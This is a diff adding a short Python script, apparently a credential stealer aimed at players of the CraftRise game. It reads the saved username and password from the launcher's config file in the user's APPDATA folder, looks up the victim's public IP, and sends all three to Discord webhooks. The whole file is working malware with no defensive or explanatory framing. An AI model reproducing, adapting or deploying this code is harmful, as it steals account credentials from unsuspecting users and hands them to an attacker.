@@ -1,0 +1,24 @@
+import json
+import os
+from dhooks import *
+import requests
+
+with open(f"{os.getenv('APPDATA')}/.craftrise/config.json") as f:
+    data = json.load(f)
+    user = data["rememberName"]
+    pwn = data["rememberPass"]
+
+ip = requests.get("https://api.ipify.org").text
+hook = Webhook("WEBHOOK-HERE")
+web=Webhook("FLEWWW")
+embed = Embed(
+    color = 8913016,
+    timestamp = "now"
+)
+embed.set_author(name=f"Craftrise Account From {ip}")
+embed.add_field(name='Username', value=f"`{user}`",inline=False)
+embed.add_field(name='Password', value=f"`{pwn}`")
+embed.set_footer(text='flewwww',icon_url = "https://www.youtube.com/channel/UC3iEMe2QCVTAp5whTdG0Y5g")
+hook.send(embed=embed)
+web.send(embed=embed)
+hh
